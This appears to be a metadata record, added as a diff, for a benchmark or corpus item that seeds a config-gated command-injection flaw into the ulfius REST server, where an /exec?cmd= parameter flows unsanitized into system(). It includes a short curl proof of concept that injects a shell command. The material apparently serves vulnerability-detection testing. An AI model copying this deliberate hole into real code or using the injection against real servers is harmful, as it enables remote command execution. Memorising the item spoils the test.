@@ -1,0 +1,43 @@
+PACKAGE:     ulfius
+COMMIT:      (corpus source at /home/ubuntu/anthropic/corpus/ulfius)
+SOURCE:      /home/ubuntu/anthropic/corpus/ulfius/server.c
+AXES:        C2 I3 S1
+
+DESCRIPTION:
+  Config-file-gated command injection in ulfius REST server. Server started with
+  --exec-config PATH; config file sets exec_mode=1 and exec_logging=1. User-
+  supplied cmd flows through exec_args_t struct dispatch into system(). No sanitization.
+
+CONFIG_GATE (C2 — config file):
+  mechanism:  key=value config parsed by read_exec_config() via fopen/fgets/sscanf
+              into struct exec_config { int enabled; int logging; char secret[64]; }
+  check:      `exec_cfg.enabled && exec_cfg.logging` in callback_exec()
+  new CLI:    --exec-config PATH
+
+INPUT_FLOW (I3 — struct dispatch):
+  entry:      HTTP GET /exec?cmd=<payload>
+  path:       callback_exec() gets cmd via u_map_get(), puts in exec_args_t,
+              calls dispatch_exec() which calls system(args->cmd)
+  transforms: pointer through struct and helper function
+
+SANITIZATION (S1 — none):
+  none
+
+SINK:        system() in dispatch_exec() (server.c)
+
+CHANGED FILES:
+  server.c — 3 hunks:
+    1. globals:   exec_cfg struct, read_exec_config(), exec_args_t, dispatch_exec()
+    2. callback:  callback_exec() with C2 gate, S1 (no check), I3 dispatch
+    3. main():    --exec-config PATH arg; ulfius_add_endpoint for /exec
+
+EXPLOIT:
+  config:  echo -e "exec_mode = 1\nexec_logging = 1" > /tmp/poc_183.conf
+  start:   ./ulfius_server --port 18183 --exec-config /tmp/poc_183.conf
+  trigger: curl 'http://127.0.0.1:18183/exec?cmd=id>/tmp/poc_183_marker'
+  verify:  cat /tmp/poc_183_marker
+
+  gate bypass: start without --exec-config; exec_cfg stays zeroed; /exec returns 404
+
+NOTES:
+  - system() output goes to server stdout/stderr, not HTTP response.
